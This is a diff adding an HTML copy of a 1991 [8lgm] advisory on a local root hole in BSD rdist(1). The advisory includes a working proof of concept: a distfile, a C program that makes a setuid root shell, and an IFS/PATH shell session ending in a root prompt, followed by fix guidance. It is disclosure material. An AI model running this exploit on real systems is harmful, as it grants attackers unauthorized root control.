@@ -1,0 +1,116 @@
+<head>
+<title>[8lgm]-Advisory-1.UNIX.rdist.23-Apr-1991</title>
+</head>
+<body>
+<hr>
+<H1>[8lgm]-Advisory-1.UNIX.rdist.23-Apr-1991
+</H1>
+<P>
+<H2>PROGRAM:</H2>
+<P>
+<PRE>
+        rdist(1)        (/usr/ucb/rdist or /usr/bin/rdist)
+</PRE>
+<P>
+<H2>VULNERABLE OS's:</H2>
+<P>
+<UL>
+<LI>        SunOS 4.1.2 or earlier (Patch-ID# 100383-06 fixes this)
+<LI>        A/UX 2.0.1
+<LI>        SCO 3.2v4.2
+<LI>        BSD NET/2 Derived Systems
+<P>
+<LI>        Most systems supporting BSD rdist
+</UL>
+<P>
+<P>
+<H2>DESCRIPTION:</H2>
+<P>
+        rdist(1) uses popen(3) to execute sendmail(8) as root.  It can
+        therefore be made to execute arbitary programs as root.
+<P>
+<H2>IMPACT:</H2>
+<P>
+        Any user with access to rdist(1) can become root.
+<P>
+<H2>REPEAT BY:</H2>
+<P>
+        This example demonstrates how to become root on most affected
+        machines by creating a set-uid root shell.  Please do not do
+        this unless you have permission.
+<P>
+        Create the following file, 'distfile':
+<P>
+<pre>
+8<--------------------------- cut here ----------------------------
+HOSTS = localhost
+FILES = BullInTheHeather
+${FILES} -> ${HOSTS}
+        install /tmp/1 ;
+        notify user ;
+8<--------------------------- cut here ----------------------------
+</pre>
+<P>
+        Create the following file, 'usr.c':
+<P>
+<pre>
+8<--------------------------- cut here ----------------------------
+main()
+{
+        setuid(0);
+        chown("sh", 0, 0);
+        chmod("sh", 04755);
+        exit(0);
+}
+8<--------------------------- cut here ----------------------------
+</pre>
+<P>
+        (Lines marked with > represent user input)
+<P>
+<pre>
+>       % cp /bin/sh .
+>       % cc -o usr usr.c
+>       % set path=(. $path)
+>       % setenv IFS /
+>       % rdist
+        updating host localhost
+        rdist: BullInTheHeather: No such file or directory
+        notify @localhost ( user )
+</pre>
+<pre>
+>       % ls -l
+        -rwsr-xr-x  1 root       106496 Mar  4 00:25 sh
+>       % ./sh
+        #
+</pre>
+<h2>FIX:</h2>
+<P>
+<OL>
+<li> Contact your vendor for a fix.  Sun's latest rdist patch
+           (Patch-ID# 100383-06) fixes this hole in SunOS.  Some vendors
+           closed this hole while fixing an unrelated problem published
+           by CERT in their advisory: CA-91:20.rdist.vulnerability.
+<P>
+<li> In the meantime, restrict access to rdist.
+</OL>
+<P>
+<P>
+<H2>FEEDBACK AND CONTACT INFORMATION:</H2>
+<P>
+<PRE>
+        8lgm-bugs@bagpuss.demon.co.uk           (To report security flaws)
+<P>
+        8lgm-request@bagpuss.demon.co.uk        (Request for [8lgm] Advisories)
+<P>
+        8lgm@bagpuss.demon.co.uk                (General enquiries)
+</PRE>
+<P>
+        System Administrators are encouraged to contact us for any
+        other information they may require about the problems described
+        in this advisory.
+<P>
+        We welcome reports about which platforms this flaw does or does
+        not exist on.
+<P>
+<hr>
+</body>
